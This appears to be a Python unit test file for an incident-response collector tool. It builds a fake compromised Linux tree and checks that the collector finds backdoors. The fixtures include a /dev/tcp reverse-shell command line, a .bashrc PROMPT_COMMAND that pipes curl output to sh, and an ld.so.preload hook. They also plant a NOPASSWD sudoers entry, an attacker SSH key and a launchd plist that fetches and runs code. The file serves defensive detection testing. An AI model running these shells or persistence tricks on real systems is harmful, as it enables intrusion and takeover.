"""跨平台可移植性测试：用合成目录树在任意平台跑通 Linux 采集逻辑。"""

from __future__ import annotations

import os
import shutil
import stat as stat_mod
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from irscan.collectors import (  # noqa: E402
    LinuxCollector, MacOSCollector, WindowsCollector,
)
from irscan.collectors.base import BaseCollector  # noqa: E402
from irscan.core.engine import ScanConfig, detect_platform  # noqa: E402
from irscan.core.models import HostSnapshot  # noqa: E402


def write(root: str, rel: str, content: str) -> str:
    """在合成根目录下写一个文件，返回真实路径。"""
    path = os.path.join(root, rel.lstrip("/"))
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


class FakeLinuxTree:
    """一棵刻意做得「像一台被入侵过的机器」的合成目录树。"""

    def __init__(self) -> None:
        self.root = tempfile.mkdtemp(prefix="irscan-fake-linux-")

    def close(self) -> None:
        shutil.rmtree(self.root, ignore_errors=True)

    def build(self) -> str:
        r = self.root

        write(r, "/proc/1/stat", "1 (systemd) S 0 1 1 0 -1 4194560 1 2 3 4 5\n")
        write(r, "/proc/1/cmdline", "/usr/lib/systemd/systemd\x00--system\x00")
        write(r, "/proc/1337/stat", "1337 (kworker/0:1-events) S 1 1337 1337 0\n")
        write(r, "/proc/1337/cmdline",
              "/bin/bash\x00-c\x00/bin/sh -i >& /dev/tcp/192.0.2.4/4444\x00")

        write(r, "/proc/self/stat", "self (not a pid) S 0 0 0\n")
        os.makedirs(os.path.join(r, "proc", "sys"), exist_ok=True)

        write(r, "/etc/hostname", "web-prod-01\n")
        write(r, "/etc/passwd",
              "root:x:0:0:root:/root:/bin/bash\n"
              "opsadmin:x:1000:1000::/home/opsadmin:/bin/bash\n"
              "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n")

        write(r, "/etc/ld.so.preload", "/tmp/.iced/libhook.so\n")

        write(r, "/etc/hosts",
              "127.0.0.1 localhost\n"
              "203.0.113.9 update.example.com\n")

        write(r, "/etc/sudoers.d/90-backdoor",
              "opsadmin ALL=(ALL) NOPASSWD: ALL\n")

        write(r, "/etc/cron.d/sync",
              "*/1 * * * * root /tmp/.x/sync.sh >/dev/null 2>&1\n")

        write(r, "/root/.ssh/authorized_keys",
              "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ attacker@host\n")

        write(r, "/root/.bashrc",
              "export PROMPT_COMMAND='curl -s http://192.0.2.4/x|sh'\n"
              "alias ls='ls --color=auto'\n")
        return r


class TestLinuxCollectorPortable(unittest.TestCase):
    """Linux 采集器必须能在非 Linux 平台上被完整验证。"""

    def setUp(self) -> None:
        self.tree = FakeLinuxTree()
        self.root = self.tree.build()
        self.cfg = ScanConfig(root=self.root, live=True, timeout=10)

    def tearDown(self) -> None:
        self.tree.close()

    def test_runs_on_any_platform(self):
        """这是本文件的核心：不依赖真实 Linux 也能跑通采集。"""
        snap = LinuxCollector(self.cfg)()
        self.assertIsInstance(snap, HostSnapshot)
        self.assertEqual(snap.platform, "linux")

    def test_hostname_from_tree(self):
        self.assertEqual(LinuxCollector(self.cfg)().hostname, "web-prod-01")

    def test_process_parsing_handles_awkward_comm(self):
        """comm 含空格、括号、斜杠时仍能正确解析。"""
        procs = {p.pid: p for p in LinuxCollector(self.cfg)().processes}
        self.assertIn(1, procs)
        self.assertIn(1337, procs)
        self.assertEqual(procs[1337].name, "kworker/0:1-events")
        self.assertEqual(procs[1337].ppid, 1)

        self.assertEqual(len(procs), 2)

    def test_cmdline_null_separated(self):
        procs = {p.pid: p for p in LinuxCollector(self.cfg)().processes}
        self.assertIn("192.0.2.4", procs[1337].cmdline)
        self.assertNotIn("\x00", procs[1337].cmdline)

    def test_backdoor_files_detected(self):
        kinds = {f.kind for f in LinuxCollector(self.cfg)().files}
        self.assertIn("ld_preload", kinds)
        self.assertIn("hosts", kinds)
        self.assertIn("authorized_keys", kinds)

    def test_sudoers_nopasswd_picked_up(self):
        files = [f for f in LinuxCollector(self.cfg)().files
                 if f.kind == "sudoers"]
        self.assertTrue(files, "NOPASSWD sudoers 应被采集到")

    def test_shell_rc_backdoor_picked_up(self):
        snap = LinuxCollector(self.cfg)()
        self.assertTrue(any("PROMPT_COMMAND" in h
                            for h in snap.extra.get("shell_rc", [])))

    def test_accounts_parsed(self):
        names = [a.username for a in LinuxCollector(self.cfg)().accounts]
        self.assertIn("root", names)
        self.assertIn("opsadmin", names)

    def test_cron_startup_collected(self):
        snap = LinuxCollector(self.cfg)()
        self.assertTrue(any("cron" in s.source or "cron" in (s.command or "")
                            for s in snap.startup),
                        f"cron 启动项未采集到: {snap.startup}")


class TestOfflineEvidenceDisk(unittest.TestCase):
    """离线分析证据盘时不执行盘上与宿主命令。"""

    def setUp(self) -> None:
        self.tree = FakeLinuxTree()
        self.root = self.tree.build()
        self.cfg = ScanConfig(root=self.root, live=True, timeout=5)

    def tearDown(self) -> None:
        self.tree.close()

    def test_is_live_root_flag(self):
        c = LinuxCollector(self.cfg)
        self.assertFalse(c.is_live_root)
        self.assertTrue(LinuxCollector(ScanConfig(root="/")).is_live_root)

    def test_ps_not_executed_for_evidence_disk(self):
        """盘上的 ps 属于被分析的系统，跑它得到的是宿主机进程——结论会全错。"""
        import irscan.collectors.linux as linux_mod
        called: list[str] = []
        real = linux_mod.run_command

        def spy(cmd, *a, **kw):
            called.append(cmd[0] if cmd else "")
            return 1, "", ""

        linux_mod.run_command = spy
        try:
            snap = LinuxCollector(self.cfg)()
        finally:
            linux_mod.run_command = real
        self.assertNotIn("ps", called, "离线分析不应执行 ps")
        self.assertNotIn("rpm", called)
        self.assertNotIn("dpkg", called)
        self.assertEqual(snap.extra.get("visible_pids"), [])

    def test_suid_scan_works_without_find(self):
        """没有 find 时退回 Python 遍历查找 SUID 文件。"""
        write(self.root, "/usr/bin/suspicious", "#!/bin/sh\n")
        write(self.root, "/usr/bin/normal", "#!/bin/sh\n")
        suid_mode = stat_mod.S_IFREG | stat_mod.S_ISUID | 0o755
        plain_mode = stat_mod.S_IFREG | 0o755

        def fake_lstat(path):
            mode = suid_mode if "suspicious" in path else plain_mode
            return os.stat_result((mode, 0, 0, 0, 0, 0, 10, 0, 0, 0))

        c = LinuxCollector(self.cfg)
        with mock.patch.object(os, "lstat", side_effect=fake_lstat):
            hits = c._walk_suid([os.path.join(self.root, "usr")])
        self.assertTrue(any("suspicious" in h for h in hits),
                        f"SUID 文件应被发现: {hits}")
        self.assertFalse(any("normal" in h for h in hits),
                         "普通文件不应被误报为 SUID")


class TestGracefulDegradation(unittest.TestCase):
    """单个采集子系统异常不影响其余结果。"""

    def test_missing_proc_still_collects_everything_else(self):
        """挂载的证据盘上没有 /proc，其余采集必须照常完成。"""
        root = tempfile.mkdtemp(prefix="irscan-noproc-")
        try:
            write(root, "/etc/hostname", "db-01\n")
            write(root, "/etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
            write(root, "/etc/ld.so.preload", "/tmp/.x/lib.so\n")

            snap = LinuxCollector(ScanConfig(root=root, timeout=5))()
            self.assertEqual(snap.processes, [])
            self.assertEqual(snap.hostname, "db-01")
            self.assertTrue(any(a.username == "root" for a in snap.accounts),
                            "账户采集不应受 /proc 缺失影响")
            self.assertTrue(any(f.kind == "ld_preload" for f in snap.files),
                            "LD_PRELOAD 后门不应因 /proc 缺失而漏掉")
        finally:
            shutil.rmtree(root, ignore_errors=True)

    def test_failing_subsystem_recorded_as_blind_spot(self):
        """失败的子系统记入盲区。"""
        tree = FakeLinuxTree()
        try:
            root = tree.build()
            c = LinuxCollector(ScanConfig(root=root, timeout=5))
            with mock.patch.object(c, "accounts",
                                   side_effect=RuntimeError("模拟权限不足")):
                snap = c()

            self.assertTrue(snap.files, "敏感文件采集应不受影响")
            self.assertTrue(snap.startup, "持久化项采集应不受影响")

            self.assertTrue(any("账户" in e for e in snap.errors),
                            f"失败的子系统未记入盲区: {snap.errors}")
        finally:
            tree.close()

    def test_windows_collector_survives_subsystem_failure(self):
        """子系统不可用时，Windows 采集器仍返回其余结果。"""
        c = WindowsCollector(ScanConfig(timeout=2))
        with mock.patch.object(c, "processes",
                               side_effect=RuntimeError("模拟 CIM 不可用")):
            snap = c()
        self.assertTrue(any("进程" in e for e in snap.errors),
                        f"失败未记入盲区: {snap.errors}")

        self.assertIsInstance(snap.accounts, list)


class TestPathMapping(unittest.TestCase):
    """_p() 是可移植性的基础，单独测。"""

    def test_default_root_is_identity(self):
        c = LinuxCollector(ScanConfig(root="/"))
        self.assertEqual(c._p("/proc/1/stat"), "/proc/1/stat")

    def test_custom_root_rewrites(self):
        c = LinuxCollector(ScanConfig(root="/mnt/evidence"))

        self.assertEqual(c._p("/proc/1/stat"),
                         os.path.join("/mnt/evidence", "proc/1/stat"))

    def test_trailing_slash_root(self):
        c = LinuxCollector(ScanConfig(root="/mnt/evidence/"))
        self.assertTrue(c._p("/etc/hosts").startswith("/mnt/evidence"))
        self.assertNotIn("//", c._p("/etc/hosts").replace("\\\\", "/"))


class TestAllCollectorsImportable(unittest.TestCase):
    """各平台的采集器模块都能导入。"""

    def test_import_all(self):
        for cls in (LinuxCollector, WindowsCollector, MacOSCollector):
            self.assertTrue(issubclass(cls, BaseCollector))

    def test_no_windows_only_import_at_module_level(self):
        """Windows 采集器不在模块顶层导入平台专属模块。"""
        import irscan.collectors.windows as w
        with open(w.__file__, encoding="utf-8") as fh:
            src = fh.read()
        for bad in ("import ctypes", "import winreg", "import msvcrt",
                    "import win32"):
            for line in src.splitlines():
                stripped = line.strip()
                if stripped == bad:
                    self.fail(f"模块顶层存在 Windows 专有导入: {bad}")

    def test_platform_detection_returns_known_value(self):
        self.assertIn(detect_platform(), ("linux", "windows", "macos", "unknown"))


class TestMacOSHelpers(unittest.TestCase):
    """macOS 采集器的纯逻辑部分——不依赖真机即可验证。"""

    def test_split_host_port_ipv4(self):
        self.assertEqual(MacOSCollector._split_host_port("192.0.2.4:443"),
                         ("192.0.2.4", 443))

    def test_split_host_port_ipv6_bracketed(self):
        self.assertEqual(MacOSCollector._split_host_port("[::1]:443"),
                         ("::1", 443))

    def test_split_host_port_empty(self):
        self.assertEqual(MacOSCollector._split_host_port(""), ("", 0))

    def test_split_host_port_no_port(self):
        self.assertEqual(MacOSCollector._split_host_port("192.0.2.4"),
                         ("192.0.2.4", 0))

    def test_emit_parses_lsof_tcp_record(self):
        out = MacOSCollector(ScanConfig())._emit(
            {"pid": "42", "cmd": "curl", "proto": "tcp",
             "state": "ESTABLISHED", "addr": "10.0.0.5:51234->192.0.2.4:443"})
        self.assertEqual(len(out), 1)
        conn = out[0]
        self.assertEqual(conn.local_addr, "10.0.0.5")
        self.assertEqual(conn.local_port, 51234)
        self.assertEqual(conn.remote_addr, "192.0.2.4")
        self.assertEqual(conn.remote_port, 443)
        self.assertEqual(conn.pid, 42)

    def test_emit_udp_has_no_remote(self):
        out = MacOSCollector(ScanConfig())._emit(
            {"pid": "7", "cmd": "mDNS", "proto": "udp", "addr": "*:5353"})
        self.assertEqual(out[0].remote_addr, "")
        self.assertEqual(out[0].local_port, 5353)

    def test_plist_program_extraction(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "evil.plist")
            with open(p, "w", encoding="utf-8") as fh:
                fh.write(
                    '<?xml version="1.0"?><plist version="1.0"><dict>'
                    "<key>Label</key><string>com.evil</string>"
                    "<key>ProgramArguments</key><array>"
                    "<string>/bin/sh</string><string>-c</string>"
                    "<string>curl x|sh</string></array></dict></plist>")
            cmd = MacOSCollector._plist_program(p)
        self.assertIn("/bin/sh", cmd)
        self.assertIn("curl", cmd)

if __name__ == "__main__":
    unittest.main()
